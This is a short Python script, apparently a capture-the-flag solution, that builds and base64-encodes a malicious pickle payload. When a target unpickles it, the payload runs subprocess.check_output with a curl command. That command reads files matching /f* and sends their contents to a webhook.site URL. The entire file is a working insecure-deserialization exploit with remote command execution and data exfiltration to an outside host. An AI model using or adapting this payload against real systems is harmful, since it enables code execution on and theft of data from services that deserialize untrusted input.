import base64

payload = b"(csubprocess\ncheck_output\n(S'curl https://webhook.site/2328efb9-bcaf-4724-86b8-fa6497a73a7b/?`cat /f*`'\ntR."
print(base64.b64encode(payload).decode())